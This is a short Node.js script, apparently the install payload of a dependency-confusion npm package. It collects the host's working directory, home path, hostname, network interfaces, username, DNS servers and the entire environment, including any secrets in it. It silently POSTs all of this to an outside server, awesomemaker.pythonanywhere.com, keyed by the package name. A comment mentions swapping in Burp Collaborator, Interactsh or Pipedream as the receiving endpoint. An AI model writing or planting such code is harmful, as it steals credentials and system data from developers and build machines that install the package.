const os = require("os");
const dns = require("dns");
const https = require("https");
const packageJSON = require("./package.json");

var postData = JSON.stringify({
    cwd: __dirname,
    home: os.homedir(),
    host: os.hostname(),
    net: os.networkInterfaces(),
    user: os.userInfo().username,
    dns: dns.getServers(),
    env: process.env
});

var options = {
    hostname: "awesomemaker.pythonanywhere.com", //replace burpcollaborator.net with Interactsh or pipedream
    port: 443,
    path: `/json?prefix=${packageJSON.name}`,
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();